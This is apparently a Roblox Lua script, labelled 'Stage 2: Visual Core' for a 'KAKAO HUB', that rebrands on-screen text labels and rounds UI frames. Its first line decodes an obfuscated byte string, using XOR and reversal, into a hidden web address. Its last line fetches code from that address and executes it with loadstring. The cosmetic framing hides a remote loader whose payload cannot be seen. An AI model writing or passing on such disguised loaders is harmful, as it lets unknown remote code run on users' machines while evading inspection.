
--[[ STAGE 2: VISUAL CORE ]]
local PEt96INMtTttRV4hl="\116\092\089\019\089\092\082\103\125\121\124\112\166\188\178\135\152\154\178\130\169\171\165\163\189\243\238\231\200\145\254\197\204\196\216\212\202\218\232\210\058\035\039\056\011\060\053\038\054\062\055\002\106\111\016\103\104\109\115\116\016\122\112\077\075\072\081\118\022\171\084\080\160\122\185\189\164\130\138\182\140\159\131\082\153\238\239\144\224\236\248\224\247\202\207\130\192\218\194\147\041\043\208\037\039\058\034\055\056\014\000\055\024\001\017\024\030\043\102\016\123\058\062\015\074\073\065\069\077"local M6Ph0JWv6bTy=43 local As0ziJjAP9r89iTQwvfW=219 local m_wlIOdCyF4P=1 local wSACId05PKv2=4 local oeqodFG7xgooJsQJN=31 local qTgYyrlTVZzIdK0SnlO0u=true local zMH_r1i06do3=bit32 and bit32.bxor if not zMH_r1i06do3 then zMH_r1i06do3=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local R2DBHSzpAgQn4VP={}for gjcH6T6L_HWdWvbNXJP=1,#PEt96INMtTttRV4hl do local zZlQWa_PlM4xKFPZh=string.byte(PEt96INMtTttRV4hl,gjcH6T6L_HWdWvbNXJP)local tEvdE43KIhEiXqSCq=(As0ziJjAP9r89iTQwvfW+(gjcH6T6L_HWdWvbNXJP*wSACId05PKv2)+oeqodFG7xgooJsQJN)%256 if m_wlIOdCyF4P==0 then zZlQWa_PlM4xKFPZh=(zZlQWa_PlM4xKFPZh-tEvdE43KIhEiXqSCq)%256 R2DBHSzpAgQn4VP[gjcH6T6L_HWdWvbNXJP]=string.char(zMH_r1i06do3(zZlQWa_PlM4xKFPZh,M6Ph0JWv6bTy))else zZlQWa_PlM4xKFPZh=zMH_r1i06do3(zZlQWa_PlM4xKFPZh,M6Ph0JWv6bTy)R2DBHSzpAgQn4VP[gjcH6T6L_HWdWvbNXJP]=string.char((zZlQWa_PlM4xKFPZh-tEvdE43KIhEiXqSCq)%256)end end local PW4hlFifN_49U5c=table.concat(R2DBHSzpAgQn4VP)if qTgYyrlTVZzIdK0SnlO0u then PW4hlFifN_49U5c=string.reverse(PW4hlFifN_49U5c)end local tSyBUWuXzn8lo2J=PW4hlFifN_49U5c
local HubName = "KAKAO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(tSyBUWuXzn8lo2J))()
